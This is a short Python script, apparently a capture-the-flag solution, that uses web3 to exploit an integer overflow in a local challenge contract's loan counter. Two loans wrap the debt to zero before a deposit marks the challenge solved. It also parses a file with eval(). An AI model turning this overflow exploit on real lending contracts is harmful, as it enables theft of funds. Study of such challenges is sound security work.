from web3 import Web3, HTTPProvider
import json
web3 = Web3(HTTPProvider("http://127.0.0.1:47643")) # Replace with the actual RPC
contract_address = "0x6af7e0b0eb6eBC561eB9e3376c9bA26f4ba86F43" # Replace with the actual contract address
wallet="0xa9384b1f9E261c624c628a5ad5fddE2a6904c775" # Replace with the actual wallet

# f = open('./build/contracts/Chall.json','r')
# contract_json=json.load(f)

x=open('abi').read()
abi=eval(x)
bank = web3.eth.contract(address=contract_address,abi=abi)
bank.functions.loan(2**48-1).transact({'from':wallet}) # Take a loan of maximum minus one
bank.functions.loan(1).transact({'from':wallet}) # Take a loan of one, overflowing the loan variable. It is now zero!
bank.functions.deposit(2**48-1).transact({'from':wallet,'value':2**48-1}) # Deposit the required ammount


print(bank.functions.isChallSolved().call()) # It is now solved!
